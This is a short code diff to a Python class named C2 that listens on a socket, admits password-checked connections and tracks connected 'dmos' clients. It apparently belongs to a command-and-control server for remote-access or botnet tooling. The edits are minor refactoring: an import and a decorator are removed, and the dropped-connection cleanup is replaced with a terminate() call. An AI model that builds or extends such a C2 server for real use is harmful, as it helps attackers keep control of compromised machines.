@@ -4,7 +4,6 @@ import json
 from lib.helper import *
 from lib.debug import Debug
 from lib.dmos import Dmos
-from termcolor import colored, cprint
 from hashlib import md5
 
 class C2():
@@ -35,7 +34,6 @@ class C2():
         self.s.bind((self.ANODE, self.APORT))
         self.s.listen(5)
 
-    @safe_exec
     def accept_conn(self):
         conn, address = self.s.accept()
         if conn.recv(36).decode() == self.PASS:
@@ -53,6 +51,4 @@ class C2():
                 try:
                     self.multi_handler.dmoss[hash].conn.send(b" ")
                 except:
-                    self.multi_handler.dmoss[hash].conn.close()
-                    Debug.tprint("Connection with dmos {} has been broken".format(self.multi_handler.dmoss[hash].md5_hash), thread=True)
-                    self.multi_handler.dmoss.pop(hash, None)
+                    terminate(self.multi_handler.dmoss, self, signal="error")
